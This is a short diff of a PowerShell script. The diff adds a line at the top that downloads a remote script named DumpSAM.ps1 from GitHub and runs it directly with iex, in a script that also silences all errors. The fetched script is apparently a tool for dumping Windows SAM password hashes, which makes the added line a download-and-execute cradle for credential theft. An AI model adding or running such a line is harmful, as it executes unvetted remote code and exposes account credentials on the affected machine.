@@ -1,3 +1,4 @@
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/DumpSAM.ps1')
 $ErrorActionPreference = "SilentlyContinue"
 $systemname = "NT.AUT.*\\"
 
